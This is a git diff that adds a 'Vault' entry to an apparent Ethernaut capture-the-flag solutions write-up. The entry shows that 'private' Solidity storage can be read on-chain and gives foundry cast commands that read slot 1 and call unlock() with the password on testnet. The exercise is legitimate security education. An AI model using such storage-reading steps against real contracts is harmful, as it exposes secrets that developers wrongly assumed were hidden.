@@ -279,3 +279,25 @@ contract Attack {
 
 Deploy this contract using remix with some wei by adding `1` in the `VALUE` field on `Deploy & run transactions` block. Then call the `attack()` function by passing `Force` contract address as argument.
 
+
+# 8: Vault
+**Level Link:** [Vault Challenge](https://ethernaut.openzeppelin.com/level/8)
+**Bug:** Private variable visibility misconception.  
+**Objective:** Read the "private" password on storage to unlock the vault.  
+**Vulnerability Analysis:**  
+Solidity stores state variables in declaration order on chain.A point to note here is `Nothing is private in on-chain`. So we can simply read the slot-1 data on-chain using foundry tool.
+```solidity
+contract Vault {
+    bool public locked;       // Slot 0
+    bytes32 private password; // Slot 1 (NOT actually private)
+}
+```
+**Steps to Attack:**
+- Read password from on-chain. nothing but from slot-1 data.
+- Call `unlock()` function with the `password` as argument.
+
+**Using foundry:**
+```shell
+ cast storage $CONTRACT_ADDRESS 1 --rpc-url $SEPOLIA_RPC_URL
+ cast send $CONTRACT_ADDRESS "unlock(bytes32)" $PASSWORD --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+```
